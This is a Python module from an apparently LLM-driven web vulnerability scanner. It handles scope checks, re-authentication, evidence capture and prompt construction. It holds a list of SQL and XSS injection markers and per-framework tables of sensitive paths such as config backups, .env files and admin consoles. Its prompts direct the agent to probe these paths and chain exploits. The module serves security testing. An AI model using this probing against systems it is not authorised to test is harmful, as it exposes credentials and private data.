from __future__ import annotations

import asyncio
import json
import logging
import os
import re
import time
from pathlib import Path

import httpx
from urllib.parse import urlparse
from playwright.async_api import async_playwright

from .api_import import (
    EndpointRegistry,
    autodiscover_openapi,
    parse_openapi_spec,
    parse_postman_collection,
)
from .auth import (
    ScanTarget,
    authenticate,
    authenticate_http_only,
    can_use_http_only_auth,
    detect_app_type,
)
from .active_baseline import (
    run_bare_root_sqli_probe,
    run_cache_poisoning_probe,
    run_reflected_xss_probe,
    run_dom_xss_probe,
    run_ssrf_probe,
    run_open_redirect_probe,
    run_sensitive_path_probe,
    run_salesforce_probe,
    run_graphql_introspection_probe,
    run_http_smuggling_probe,
    run_oauth_oidc_probe,
)
from .subdomain_takeover import (
    _resolve_cname,
    _match_provider,
    build_takeover_findings,
    TakeoverResult,
)
from .llm_config import ContentFiltered, ContextWindowExceeded, MalformedMessages, LLMRouter
from .passive_recon import (
    run_host_delta_passive_check,
    run_http_only_passive_recon,
    run_passive_recon,
)
from .prompts import (
    build_system_prompt,
    get_phases,
    CHAIN_SUB_PHASES,
    REACTIVE_CHAIN_TRIGGERS,
    ScanPhase,
)
from .severity import classify_severity
from .tools import TOOL_DEFINITIONS, ScanTools
from .llm_detect import detect_llm_features
from .llm_baseline import run_all_probes as run_llm_baseline_probes
from .garak_runner import run_garak, is_garak_available

logger = logging.getLogger(__name__)

MAX_MSG_RESULT_CHARS = 1500


def _s(val) -> str:
    """Safely coerce any value to str — LLMs sometimes return dicts/lists where strings are expected."""
    if val is None:
        return ""
    if isinstance(val, str):
        return val
    if isinstance(val, dict):
        return "" if not val else str(val)
    if isinstance(val, (list, tuple)):
        return "" if not val else str(val)
    return str(val)
TRIM_TARGET_TOKENS = 40000


class ScanCancelled(Exception):
    """Raised when a scan is cancelled by the user."""


def _extract_base_domain(url: str) -> str:
    """Extract the registrable domain from a URL (e.g. 'avg.com' from 'https://www.avg.com/cs-cz')."""
    try:
        host = urlparse(url).hostname or ""
    except Exception:
        return ""
    parts = host.lower().split(".")
    if len(parts) >= 2:
        return ".".join(parts[-2:])
    return host


AFFILIATED_DOMAIN_GROUPS: list[set[str]] = [
    # Add groups of affiliated domains here. If the target matches any domain
    # in a group, all other domains in the same group become in-scope.
    # Example: {"example.com", "example-cdn.com", "example-api.com"}
]


def _build_allowed_domains(target_url: str, extra_domains: set | None = None) -> set:
    """Build full set of allowed domains from the target URL and any affiliated groups."""
    base = _extract_base_domain(target_url)
    allowed = {base} if base else set()
    for group in AFFILIATED_DOMAIN_GROUPS:
        if base in group or any(kw in base for kw in group):
            allowed |= group
    if extra_domains:
        allowed |= extra_domains
    return allowed


def _is_in_scope(url: str, allowed_domains: set) -> bool:
    """Check if a URL belongs to one of the allowed base domains."""
    try:
        host = (urlparse(url).hostname or "").lower()
    except Exception:
        return False
    for d in allowed_domains:
        if host == d or host.endswith("." + d):
            return True
    return False

_VALID_TOOL_NAME = re.compile(r"[^a-zA-Z0-9_\-]")

_LOGIN_PAGE_INDICATORS = (
    "login", "log in", "sign in", "signin", "authenticate",
    "sso", "password", "credentials", "username",
)


async def _check_session_lost(page, auth_session, target, original_url: str,
                              router=None, model: str = "",
                              interactive_session=None,
                              on_progress=None, cancel_flag=None) -> bool:
    """Detect if the session was lost (redirected to login page).

    Returns True if re-authentication was performed.
    When *interactive_session* is provided, opens the interactive browser
    for the user to re-authenticate manually.
    """
    if not auth_session or auth_session._auth_type in ("none", "bearer", "api_key"):
        return False
    try:
        current_url = page.url.lower()
        title = (await page.title() or "").lower()
    except Exception:
        return False

    try:
        parsed = urlparse(current_url)
        check_str = f"{parsed.hostname or ''}{parsed.path or ''}"
    except Exception:
        check_str = current_url
    is_login_page = any(kw in check_str for kw in _LOGIN_PAGE_INDICATORS)
    if not is_login_page:
        is_login_page = any(kw in title for kw in _LOGIN_PAGE_INDICATORS)
    if not is_login_page:
        try:
            has_pw_field = await page.evaluate(
                "() => !!document.querySelector('input[type=password]')"
            )
            if has_pw_field:
                is_login_page = True
        except Exception:
            pass

    if not is_login_page:
        return False

    logger.warning("Session lost — detected login page at %s. Re-authenticating...", page.url)
    try:
        from .auth import authenticate as _reauth
        browser = page.context.browser
        new_session = await _reauth(browser, target, router, model,
                                    interactive_session=interactive_session,
                                    on_progress=on_progress,
                                    cancel_flag=cancel_flag)
        new_cookies = await new_session.page.context.cookies()
        await page.context.add_cookies(new_cookies)
        await page.goto(original_url, wait_until="domcontentloaded", timeout=15000)
        logger.info("Re-authentication successful, resumed at %s", original_url)
        return True
    except Exception as e:
        logger.error("Re-authentication failed: %s", e)
        return False

def _sanitize_tool_name(name: str) -> str:
    """Bedrock requires tool names matching [a-zA-Z0-9_-]+ and <= 64 chars."""
    cleaned = _VALID_TOOL_NAME.sub("_", name) if name else "unknown"
    return cleaned[:64]


def _to_plain_dict(obj):
    """Convert any object (Pydantic model, dataclass, etc.) to a plain dict."""
    if obj is None:
        return {}
    if hasattr(obj, "model_dump"):
        return obj.model_dump()
    if isinstance(obj, dict):
        return dict(obj)
    if hasattr(obj, "__dict__"):
        return dict(vars(obj))
    return {}


def _sanitize_message(msg: dict) -> dict:
    """Ensure all tool_call function names in an assistant message are Bedrock-safe."""
    tcs = msg.get("tool_calls")
    if not tcs:
        return msg
    cleaned = []
    for tc in tcs:
        if not isinstance(tc, dict):
            tc = _to_plain_dict(tc)
        else:
            tc = dict(tc)
        fn = tc.get("function")
        if fn is not None:
            if not isinstance(fn, dict):
                fn = _to_plain_dict(fn)
            else:
                fn = dict(fn)
            fn["name"] = _sanitize_tool_name(fn.get("name") or "")
            tc["function"] = fn
        cleaned.append(tc)
    msg = dict(msg)
    msg["tool_calls"] = cleaned
    return msg


def _sanitize_all_messages(messages):
    """Pre-send sweep: sanitize tool names in all assistant messages."""
    for i, m in enumerate(messages):
        if isinstance(m, dict) and m.get("tool_calls"):
            messages[i] = _sanitize_message(m)
    return messages


def _strip_exchanges(obj):
    """Remove http_exchange from tool results before sending to the LLM."""
    if isinstance(obj, dict):
        out = {k: _strip_exchanges(v) for k, v in obj.items() if k != "http_exchange"}
        return out
    if isinstance(obj, list):
        return [_strip_exchanges(item) for item in obj]
    return obj


def _cap_result(result: dict) -> str:
    """Serialize tool result and cap its size for message history."""
    clean = _strip_exchanges(result)
    raw = json.dumps(clean, default=str)
    if len(raw) <= MAX_MSG_RESULT_CHARS:
        return raw
    return raw[:MAX_MSG_RESULT_CHARS] + '..."}'


def _estimate_tokens(messages: list[dict]) -> int:
    return len(json.dumps(messages, default=str)) // 4


_API_PATH_PATTERNS = re.compile(
    r"/(api|v\d+|graphql|rest|oauth|token|webhook|callback|ws|rpc|feed|sitemap\.xml)"
    r"(/|$|\?)", re.IGNORECASE
)
_API_EXTENSIONS = re.compile(
    r"\.(json|xml|yaml|yml|wsdl|proto|graphql)(\?|#|$)", re.IGNORECASE
)
_PAGE_EXTENSIONS = re.compile(
    r"\.(html?|php|aspx?|jsp|css|js|png|jpe?g|gif|svg|ico|webp|woff2?|ttf|eot|pdf|mp[34]|webm)(\?|#|$)",
    re.IGNORECASE,
)
_SECURITY_TEST_TOOLS = frozenset({
    "inject_payload", "fuzz_parameter", "api_request",
    "test_auth_bypass", "test_method_override", "api_request_raw",
    "replay_with_modification", "ws_inject", "execute_js",
    "test_token_security",
})

def _classify_url(url: str, result: dict, tool_name: str) -> str:
    """Classify a crawled URL as 'api', 'page', or 'test' based on URL
    structure and response content — NOT the tool that was used."""
    if tool_name in _SECURITY_TEST_TOOLS:
        return "test"

    from urllib.parse import urlparse
    path = urlparse(url).path.lower().rstrip("/")

    if _PAGE_EXTENSIONS.search(path):
        return "page"
    if _API_PATH_PATTERNS.search(path) or _API_EXTENSIONS.search(path):
        return "api"

    content_type = ""
    body = ""
    if isinstance(result, dict):
        hdrs = result.get("headers") or {}
        ct_from_headers = ""
        for k, v in hdrs.items():
            if k.lower() == "content-type":
                ct_from_headers = str(v).lower()
                break
        content_type = (str(result.get("content_type") or "") or ct_from_headers).lower()
        body = str(result.get("body_snippet") or result.get("body") or "")[:300].strip()
        if not body:
            nested = result.get("results")
            if isinstance(nested, list) and nested:
                first = nested[0] if isinstance(nested[0], dict) else {}
                body = str(first.get("body_snippet") or "")[:300].strip()

    if content_type:
        if any(t in content_type for t in (
            "application/json", "application/xml", "text/xml",
            "application/graphql", "application/grpc",
            "application/protobuf", "application/msgpack",
            "application/ld+json", "application/hal+json",
            "application/problem+json", "application/vnd.",
        )):
            return "api"
        if any(t in content_type for t in ("text/html", "text/css", "image/", "font/")):
            return "page"

    if body:
        stripped = body.lstrip()
        if stripped.startswith(("{", "[", "<?xml")):
            return "api"
        if stripped.startswith(("<!DOCTYPE", "<html", "<HTML", "<head", "<HEAD")):
            return "page"

    if tool_name == "navigate":
        return "page"

    return "page"


_MAX_EVIDENCE_PER_PHASE = 120

_INJECTION_MARKERS = ("'", '"', "<", ">", "UNION", "SELECT", "script", "onerror",
                      "onload", "alert", "SLEEP", "WAITFOR", "--", "#", "{{", "${")


def _capture_evidence(
    evidence: list[dict],
    tool: str,
    args: dict,
    resp_summary: dict | str,
    full_result: dict,
):
    """Capture compact evidence records for every security test tool call.

    For fuzz_parameter, captures each individual payload result separately
    so the LLM has granular evidence to cite.  Other tools get a single
    record.  Keeps each record compact (~150 chars) so even 60 records
    fit in a single context message (~9K chars).
    """
    if len(evidence) >= _MAX_EVIDENCE_PER_PHASE:
        return
    if not isinstance(full_result, dict):
        return

    # fuzz_parameter returns multiple results — capture each separately
    if tool == "fuzz_parameter" and isinstance(full_result.get("results"), list):
        ep_url = str(full_result.get("endpoint", ""))[:120]
        param = str(full_result.get("param", ""))
        for r in full_result["results"]:
            if len(evidence) >= _MAX_EVIDENCE_PER_PHASE:
                break
            r_payload = str(r.get("payload", ""))[:150]
            r_status = str(r.get("status", ""))
            r_body = str(r.get("body_snippet", ""))[:100]
            r_anomaly = r.get("anomaly")
            r_reflected = r.get("reflected")
            flags = []
            if r_anomaly:
                flags.append("ANOMALY")
            if r_reflected:
                flags.append("REFLECTED")
            try:
                if r_status and int(r_status) >= 400:
                    flags.append("ERROR")
            except (ValueError, TypeError):
                pass
            entry = {
                "tool": f"fuzz_parameter[{param}]",
                "url": ep_url,
                "payload": r_payload,
                "status": r_status,
                "flags": " ".join(flags),
                "evidence": r_body[:200],
            }
            if r.get("http_exchange"):
                entry["http_exchange"] = r["http_exchange"]
            evidence.append(entry)
        return

    status = full_result.get("status", "")
    body = str(full_result.get("body_snippet", ""))[:120]
    error = str(full_result.get("error", ""))[:100]
    reflected = full_result.get("reflected")
    anomaly = full_result.get("anomaly")
    title = str(full_result.get("title", "") or full_result.get("error_title", ""))[:80]

    inject_errors = full_result.get("errors")
    if isinstance(inject_errors, list) and inject_errors:
        anomaly = True
        if not error:
            error = "; ".join(str(e) for e in inject_errors[:3])

    vuln_detected = full_result.get("VULNERABILITIES_DETECTED")
    if vuln_detected:
        anomaly = True

    url = ""
    if isinstance(args, dict):
        url = str(args.get("url") or args.get("endpoint") or full_result.get("url") or "")[:120]

    payload = ""
    if isinstance(args, dict):
        payload = str(args.get("body") or args.get("payload") or args.get("value") or args.get("script") or "")[:150]
        if not payload and args.get("raw"):
            payload = str(args["raw"])[:150]

    snippet_parts = []
    if title and ("error" in title.lower() or "Error" in title):
        snippet_parts.append(title)
    if error:
        snippet_parts.append(error)
    if body and not error:
        snippet_parts.append(body[:100])
    snippet = " | ".join(snippet_parts) if snippet_parts else str(status)

    flags = []
    if anomaly:
        flags.append("ANOMALY")
    if reflected:
        flags.append("REFLECTED")
    try:
        if status and int(str(status)) >= 400:
            flags.append("ERROR")
        elif status and int(str(status)) == 200:
            flags.append("OK")
    except (ValueError, TypeError):
        pass

    entry = {
        "tool": tool,
        "url": url,
        "payload": payload,
        "status": str(status),
        "flags": " ".join(flags),
        "evidence": snippet[:200],
    }
    if isinstance(full_result, dict) and full_result.get("http_exchange"):
        entry["http_exchange"] = full_result["http_exchange"]
    evidence.append(entry)


def _format_evidence_buffer(evidence: list[dict]) -> str:
    """Format the evidence buffer into a context message for finding generation."""
    if not evidence:
        return ""
    lines = [
        "=== EVIDENCE LOG FROM YOUR TOOL CALLS ===",
        "Below is a record of every security test you performed. Use these EXACT",
        "payloads and responses when writing your findings JSON.",
        "",
    ]
    for i, ev in enumerate(evidence, 1):
        flags = f" [{ev.get('flags', '')}]" if ev.get("flags") else ""
        lines.append(
            f"{i}. [{ev['tool']}]{flags} {ev['url']}"
        )
        if ev.get("payload"):
            lines.append(f"   Payload: {ev['payload']}")
        lines.append(f"   Status: {ev['status']} | Response: {ev['evidence']}")
    lines.append("")
    lines.append(
        "REQUIRED: For each finding, the 'payload' field must contain the EXACT "
        "string from a Payload line above. The 'evidence' field must contain the "
        "EXACT Status + Response that proves the issue. The 'url' field must be "
        "the EXACT URL tested. The 'parameter' must name the specific input field. "
        "Findings without these fields will be REJECTED."
    )
    return "\n".join(lines)


def _match_evidence_to_finding(finding: dict, evidence: list[dict]):
    """Attach matching tool call request/response records to a finding.

    Searches the evidence buffer for entries whose URL or payload overlap
    with the finding's url/payload, and attaches the top matches as
    ``request_response`` so the UI can display Burp-style detail.
    """
    if not evidence:
        return
    f_url = _s(finding.get("url")).lower()
    f_payload = _s(finding.get("payload")).lower()

    scored: list[tuple[int, dict]] = []
    for ev in evidence:
        score = 0
        ev_url = _s(ev.get("url")).lower()
        ev_payload = _s(ev.get("payload")).lower()
        if f_url and ev_url and (f_url in ev_url or ev_url in f_url):
            score += 2
        if f_payload and ev_payload and f_payload in ev_payload:
            score += 3
        elif f_payload and ev_payload:
            f_words = set(f_payload.split())
            ev_words = set(ev_payload.split())
            if f_words & ev_words:
                score += 1
        flags = ev.get("flags", "")
        if "ERROR" in flags or "ANOMALY" in flags or "REFLECTED" in flags:
            score += 1
        if score > 0:
            scored.append((score, ev))

    scored.sort(key=lambda x: -x[0])
    matches = [ev for _, ev in scored[:5]]
    if matches:
        finding["request_response"] = matches


def _format_passive_for_llm(passive_findings: list[dict]) -> str:
    """Summarize passive recon results so the LLM agent is aware of them."""
    if not passive_findings:
        return ""
    lines = ["## Passive Reconnaissance Results (pre-scan, no LLM)",
             f"Found {len(passive_findings)} issue(s) via deterministic checks:"]
    for f in passive_findings:
        lines.append(f"- [{_s(f.get('severity'))}] {_s(f.get('title'))} @ {_s(f.get('url'))}")
        if f.get("evidence"):
            lines.append(f"  Evidence: {_s(f['evidence'])[:200]}")
    lines.append("\nUse these findings to prioritize your active scanning. "
                 "For JS sink findings, attempt to prove exploitability by tracing user-controlled data into those sinks.")
    return "\n".join(lines)


def _build_findings_context(findings: list[dict], phase_id: str) -> str:
    """Build a compact findings summary for cross-phase context injection.

    Gives the LLM awareness of what has been found so far, enabling it to
    leverage earlier discoveries for deeper exploitation and chaining.
    """
    if not findings:
        return ""
    by_sev: dict[str, list[dict]] = {}
    for f in findings:
        sev = _s(f.get("severity", "info")).lower()
        by_sev.setdefault(sev, []).append(f)

    lines = [
        "## Findings Discovered So Far (from prior phases)",
        f"Total: {len(findings)} finding(s)",
    ]
    for sev in ("critical", "high", "medium", "low", "info"):
        group = by_sev.get(sev, [])
        if not group:
            continue
        lines.append(f"\n### {sev.upper()} ({len(group)})")
        for i, f in enumerate(group[:15], 1):
            url = _s(f.get("url", ""))
            title = _s(f.get("title", ""))
            payload = _s(f.get("payload", ""))
            param = _s(f.get("parameter", ""))
            entry = f"  {i}. {title}"
            if url:
                entry += f" @ {url}"
            if param:
                entry += f" [param: {param}]"
            if payload:
                entry += f" [payload: {payload[:80]}]"
            lines.append(entry)
        if len(group) > 15:
            lines.append(f"  ... and {len(group) - 15} more")

    lines.append(
        "\n**EXPLOIT CHAINING**: Look for combinations of the above findings "
        "that could be chained for higher impact. If you see an opportunity, "
        "use the `chain_exploit` tool to declare and execute the chain step-by-step. "
        "You can also call `get_findings_so_far` at any time to review the full list."
    )
    return "\n".join(lines)


_TECH_PROBE_PATHS: dict[str, dict] = {
    "Adobe Experience Manager (AEM)": {
        "label": "Adobe Experience Manager (AEM)",
        "paths": [
            ("/libs/granite/security/currentuser.json", "User info servlet — leaks internal user paths"),
            ("/crx/de/index.jsp", "CRX DE content explorer — full repository access"),
            ("/crx/explorer/browser/index.jsp", "CRX repository browser"),
            ("/system/console", "Apache Felix OSGi console — full server control"),
            ("/system/console/bundles", "OSGi bundle listing"),
            ("/system/console/configMgr", "OSGi configuration manager"),
            ("/bin/querybuilder.json", "QueryBuilder servlet — content enumeration"),
            ("/bin/querybuilder.json?path=/content&p.limit=10", "QueryBuilder with content query"),
            ("/content.json", "Root content tree as JSON"),
            ("/content.infinity.json", "Full content tree dump"),
            ("/.json", "Sling default JSON export of root"),
            ("/content/dam.json", "DAM assets as JSON"),
            ("/content/dam.tidy.-1.json", "DAM deep JSON export via tidy selector"),
            ("/etc/packages.json", "AEM package listing"),
            ("/etc/replication.json", "Replication agent config"),
            ("/libs/granite/core/content/login.html", "Granite login page (confirms AEM)"),
            ("/libs/granite/security/userinfo.json", "Extended user information"),
            ("/libs/granite/ui/content/shell.html", "Granite UI shell"),
            ("/libs/cq/search/content/querydebug.html", "Query debug console"),
            ("/system/sling/cqform/defaultlogin.html", "Sling default login form"),
            ("/bin/receive", "Replication receiver endpoint"),
            ("/bin/replicate.json", "Replication trigger endpoint"),
            ("/home/users.json", "User home directory listing"),
            ("/home/groups.json", "Group home directory listing"),
            ("/etc/reports/diskusage.html", "Disk usage report"),
            ("/libs/granite/security/content/admin.html", "Granite admin console"),
        ],
    },
    "WordPress": {
        "label": "WordPress",
        "paths": [
            ("/wp-login.php", "WordPress login page"),
            ("/wp-admin/", "WordPress admin dashboard"),
            ("/wp-json/wp/v2/users", "REST API user enumeration"),
            ("/wp-json/wp/v2/posts", "REST API posts listing"),
            ("/?rest_route=/wp/v2/users", "REST API user enum (pretty permalinks off)"),
            ("/xmlrpc.php", "XML-RPC interface (brute-force, pingback attacks)"),
            ("/wp-config.php.bak", "Backup of config file with DB credentials"),
            ("/wp-config.php~", "Editor backup of config file"),
            ("/.wp-config.php.swp", "Vim swap file for config"),
            ("/wp-content/debug.log", "Debug log with sensitive errors"),
            ("/wp-content/uploads/", "Uploads directory listing"),
            ("/readme.html", "WordPress version disclosure"),
            ("/wp-includes/version.php", "Version file"),
            ("/wp-cron.php", "WP-Cron endpoint"),
            ("/?author=1", "Author enumeration via redirect"),
        ],
    },
    "Drupal": {
        "label": "Drupal",
        "paths": [
            ("/user/login", "Drupal login page"),
            ("/admin/", "Admin dashboard"),
            ("/CHANGELOG.txt", "Version disclosure"),
            ("/core/CHANGELOG.txt", "Drupal 8+ version disclosure"),
            ("/core/install.php", "Installation script"),
            ("/update.php", "Update script"),
            ("/xmlrpc.php", "XML-RPC interface"),
            ("/sites/default/files/", "Default files directory"),
            ("/sites/default/settings.php", "Settings file"),
            ("/node/1", "First content node"),
            ("/jsonapi/node/article", "JSON API content listing"),
            ("/jsonapi/user/user", "JSON API user enumeration"),
            ("/?q=user/password", "Password reset form (user enumeration)"),
        ],
    },
    "Django": {
        "label": "Django",
        "paths": [
            ("/admin/", "Django admin panel"),
            ("/admin/login/", "Django admin login"),
            ("/__debug__/", "Django Debug Toolbar"),
            ("/api/", "API root"),
            ("/static/admin/", "Admin static assets (confirms Django)"),
            ("/media/", "Media file directory"),
            ("/settings/", "Possible settings exposure"),
        ],
    },
    "Ruby on Rails": {
        "label": "Ruby on Rails",
        "paths": [
            ("/rails/info/properties", "Rails environment info"),
            ("/rails/info/routes", "Route listing"),
            ("/rails/mailers", "Mailer previews"),
            ("/sidekiq/", "Sidekiq dashboard"),
            ("/admin/", "Admin panel"),
            ("/assets/", "Asset pipeline"),
        ],
    },
    "Sitecore": {
        "label": "Sitecore",
        "paths": [
            ("/sitecore/login", "Sitecore login page"),
            ("/sitecore/admin/", "Sitecore admin tools"),
            ("/sitecore/shell/", "Sitecore shell"),
            ("/sitecore/debug/", "Debug pages"),
            ("/-/speak/v1/bundles/", "Sitecore SPEAK UI"),
            ("/sitecore/api/ssc/", "Sitecore Services Client API"),
        ],
    },
    "Magento": {
        "label": "Magento",
        "paths": [
            ("/admin/", "Magento admin (default path)"),
            ("/magento_version", "Version disclosure"),
            ("/downloader/", "Magento Connect Manager"),
            ("/app/etc/local.xml", "Config file with DB credentials"),
            ("/var/export/", "Data export directory"),
            ("/var/log/system.log", "System log file"),
            ("/api/rest/products", "REST API products"),
        ],
    },
    "TYPO3": {
        "label": "TYPO3",
        "paths": [
            ("/typo3/", "TYPO3 backend login"),
            ("/typo3/install.php", "Install tool"),
            ("/typo3conf/LocalConfiguration.php", "Configuration file"),
            ("/typo3temp/", "Temporary files directory"),
            ("/fileadmin/", "File admin directory"),
        ],
    },
    "Shopify": {
        "label": "Shopify",
        "paths": [
            ("/admin/", "Shopify admin"),
            ("/cart.json", "Cart data as JSON"),
            ("/products.json", "Products listing"),
            ("/collections.json", "Collections listing"),
            ("/meta.json", "Shop metadata"),
        ],
    },
    "ASP.NET": {
        "label": "ASP.NET",
        "paths": [
            ("/elmah.axd", "ELMAH error log viewer"),
            ("/trace.axd", "ASP.NET trace viewer"),
            ("/web.config", "ASP.NET config file"),
            ("/_layouts/viewlsts.aspx", "SharePoint list view"),
        ],
    },
    "Laravel (PHP)": {
        "label": "Laravel",
        "paths": [
            ("/.env", "Environment file with secrets"),
            ("/telescope", "Laravel Telescope debug dashboard"),
            ("/horizon", "Laravel Horizon queue dashboard"),
            ("/storage/logs/laravel.log", "Application log file"),
            ("/nova/login", "Laravel Nova admin"),
        ],
    },
    "Next.js": {
        "label": "Next.js",
        "paths": [
            ("/_next/data/", "Next.js data directory"),
            ("/api/", "API routes"),
            ("/_error", "Custom error page"),
        ],
    },
}


def _get_tech_probe_paths(techs: dict) -> list[str]:
    """Build probe-path sections for detected technologies."""
    sections: list[str] = []
    for tech_name in techs:
        probe = _TECH_PROBE_PATHS.get(tech_name)
        if not probe:
            for key, val in _TECH_PROBE_PATHS.items():
                if key.lower() in tech_name.lower() or tech_name.lower() in key.lower():
                    probe = val
                    break
        if not probe:
            continue
        sections.append(f"### {probe['label']} — Probe these paths:")
        for path, desc in probe["paths"]:
            sections.append(f"  - `GET {path}` — {desc}")
        sections.append("")
    return sections


def _build_tech_context_prompt(tech_fingerprint: dict) -> str:
    """Build LLM prompt section from detected technology fingerprints.

    Instead of hardcoding vulnerability checks for each technology, we tell
    the LLM what we detected and rely on its training knowledge to generate
    context-aware security tests autonomously.
    """
    techs = tech_fingerprint.get("technologies", {})
    if not techs:
        return ""

    lines = [
        "## Detected Technology Stack",
        "The following technologies were fingerprinted during passive reconnaissance:",
        "",
    ]
    by_category: dict[str, list[str]] = {}
    for name, info in techs.items():
        cat = info.get("category", "other") or "other"
        conf = info.get("confidence", "medium")
        evidence = info.get("evidence", "")
        entry = f"  - **{name}** (confidence: {conf}) — {evidence}"
        by_category.setdefault(cat, []).append(entry)

    category_labels = {
        "cms": "Content Management System",
        "framework": "Application Framework",
        "web_server": "Web Server",
        "language": "Programming Language",
        "cdn": "CDN / Edge",
        "proxy": "Reverse Proxy",
        "hosting": "Hosting Platform",
        "runtime": "Application Runtime",
        "analytics": "Analytics / Marketing",
        "ecommerce": "E-Commerce Platform",
        "static_site": "Static Site Generator",
    }
    for cat, entries in by_category.items():
        label = category_labels.get(cat, cat.replace("_", " ").title())
        lines.append(f"**{label}:**")
        lines.extend(entries)
        lines.append("")

    # Inject technology-specific probe paths
    probe_sections = _get_tech_probe_paths(techs)
    if probe_sections:
        lines.append("## MANDATORY: Technology-Specific Path Probing")
        lines.append("")
        lines.append(
            "Based on the detected technologies, you MUST probe the following paths "
            "using the `api_request` tool (GET requests). For each path, report what "
            "you find: a 200 response with content is a confirmed finding; a 302 redirect "
            "to an error/login page means the path exists but is partially protected "
            "(still worth reporting as information disclosure); 403/404 means properly blocked."
        )
        lines.append("")
        lines.extend(probe_sections)
        lines.append("")

    lines.extend([
        "## IMPORTANT: Context-Aware Security Testing",
        "",
        "In addition to the mandatory paths above, use your knowledge of these "
        "technologies to guide your testing:",
        "",
        "1. **Known misconfiguration patterns**: Test for common misconfigurations specific to "
        "each detected technology (e.g., exposed debug modes, default credentials, "
        "unrestricted management interfaces).",
        "",
        "2. **Version-specific vulnerabilities**: If you can identify the version (from headers, "
        "meta tags, JS files, or error pages), check for known CVEs affecting that version.",
        "",
        "3. **Stack interaction issues**: Look for security issues arising from how the detected "
        "technologies interact (e.g., CDN cache poisoning, proxy header injection, CMS plugin vulnerabilities).",
        "",
        "Do NOT limit yourself to generic OWASP checks — leverage your specific knowledge of "
        "the detected technologies to find issues a generic scanner would miss.",
    ])
    return "\n".join(lines)


def _hosts_match(current_host: str, target_host: str) -> bool:
    """Check if current host matches target — exact match or same root domain.
    e.g., my.norton.com matches norton.com, login.norton.com matches my.norton.com."""
    if current_host == target_host:
        return True
    from scanners.ai_agent.auth import _extract_root_domain
    return _extract_root_domain(current_host) == _extract_root_domain(target_host)


async def _ensure_on_target(page, target_url: str, target_host: str) -> bool:
    """Navigate to the target URL and confirm the browser is on the right host.

    Returns True if the current page hostname matches target_host (or same root domain).
    """
    current_host = urlparse(page.url or "").hostname or ""
    if _hosts_match(current_host, target_host):
        return True

    print(f"  [NAV] Navigating to target (current: {current_host} -> {target_host}): {target_url}")
    for attempt in range(3):
        try:
            resp = await page.goto(target_url, wait_until="domcontentloaded", timeout=30000)
            status = resp.status if resp else "no-response"
            await asyncio.sleep(4 + attempt * 3)
            final_url = page.url or ""
            current_host = urlparse(final_url).hostname or ""
            if _hosts_match(current_host, target_host):
                print(f"  [NAV] Landed on target (HTTP {status}): {final_url[:120]}")
                return True
            print(f"  [NAV] Attempt {attempt+1}: HTTP {status}, landed on {current_host} ({final_url[:120]}), expected {target_host}")
        except Exception as nav_err:
            print(f"  [NAV] Attempt {attempt+1} error: {nav_err}")
            logger.debug("Target nav attempt %d: %s", attempt, nav_err)
    print(f"  [NAV] Could not reach target after 3 attempts, current page: {page.url[:150]}")
    return False


async def _wait_for_spa_ready(page, timeout_s: int = 25):
    """Generic SPA readiness wait — framework-agnostic.

    Strategy:
    1. Wait for networkidle (no new requests for 500ms).
    2. Poll the DOM content hash until it stabilises (SPA has finished
       rendering route components, lazy chunks, iframes).
    3. Cap total wait to avoid blocking forever on long-polling apps.
    """
    try:
        await page.wait_for_load_state("networkidle", timeout=15000)
    except Exception:
        pass

    # Poll DOM stability: hash the document.body.childElementCount + frame count
    prev_hash = ""
    stable_ticks = 0
    for _ in range(timeout_s // 2):
        try:
            cur_hash = await page.evaluate("""() => {
                const fc = document.querySelectorAll('iframe').length;
                const sc = document.querySelectorAll('script[src]').length;
                const bc = document.body ? document.body.childElementCount : 0;
                return `${bc}-${sc}-${fc}`;
            }""")
        except Exception:
            cur_hash = ""
        if cur_hash == prev_hash and cur_hash:
            stable_ticks += 1
            if stable_ticks >= 2:
                break
        else:
            stable_ticks = 0
            prev_hash = cur_hash
        await asyncio.sleep(2)

    # Final networkidle check after DOM settled
    try:
        await page.wait_for_load_state("networkidle", timeout=5000)
    except Exception:
        pass


def _resolve_import_path(base_dir: str, path: str | None) -> str | None:
    if not path:
        return None
    if os.path.isabs(path):
        return path if os.path.exists(path) else None
    resolved = os.path.normpath(os.path.join(base_dir, path))
    return resolved if os.path.exists(resolved) else path


# ── Multi-Agent Parallel Execution ────────────────────────────────────────
# Maximum number of concurrent LLM agent workers during parallel phase
# execution.  Each worker gets its own browser context and LLM conversation.
# Set to 1 to disable parallelism (sequential fallback).
MAX_PARALLEL_WORKERS = 5


async def _clone_browser_context(browser, auth_cookies: list[dict], target_url: str):
    """Create an isolated browser context with cloned auth cookies.

    Each parallel worker gets its own context so navigations and DOM state
    don't interfere with each other.
    """
    context = await browser.new_context(
        ignore_https_errors=True,
        java_script_enabled=True,
    )
    if auth_cookies:
        await context.add_cookies(auth_cookies)
    page = await context.new_page()
    try:
        await page.goto(target_url, wait_until="domcontentloaded", timeout=15000)
    except Exception:
        pass
    return context, page


async def _run_smart_retry_pass(
    *,
    phase: ScanPhase,
    messages: list[dict],
    findings: list[dict],
    phase_evidence: list[dict],
    phase_findings_before: int,
    tools,
    router: LLMRouter,
    model: str,
    cancel_flag,
    on_progress: callable | None = None,
    metrics: dict | None = None,
    phase_num: int = 0,
    total_phases: int = 0,
) -> tuple[int, int]:
    """Hybrid Smart Retry — re-run a phase with a tailored prompt.

    Originally lived inline inside the sequential ``run_scan`` loop. Lifted
    to module scope so the parallel worker (``_run_phase_worker``) can
    invoke the same retry path. Without this, parallel scans regressed on
    Sonnet 4.5 (28-Apr-2026: 110 -> 56 findings on the same target) because
    the worker only did a passive evidence-summary pass with ``tools=[]``,
    while the sequential path did an active retry with the full tool set
    and a phase-tailored prompt.

    The caller is responsible for the **trigger condition**
    (``retry_prompts.should_run_smart_retry``); this helper only
    *executes* the retry pass once the caller has decided to fire.

    Mutates ``messages`` and ``findings`` in place. Returns
    ``(retry_new_findings, retry_tool_calls)``.
    """
    from . import retry_prompts as _rp
    _cb = on_progress or (lambda *a, **k: None)

    def _check_cancel():
        if cancel_flag and cancel_flag.is_set():
            raise ScanCancelled("Scan stopped by user")

    evidence_text = _format_evidence_buffer(phase_evidence)
    prompt_key = _rp._PHASE_TO_PROMPT_KEY.get(phase.id, "injection")
    retry_prompt = _rp._RETRY_PROMPTS[prompt_key].format(
        name=phase.name, evidence=evidence_text,
    )

    _cb("phase_start", {
        "phase": phase_num, "total": total_phases,
        "name": f"{phase.name} (retry)", "id": f"{phase.id}_retry",
    })
    messages.append({"role": "user", "content": retry_prompt})

    phase_evidence_retry: list[dict] = []
    retry_findings_before = len(findings)
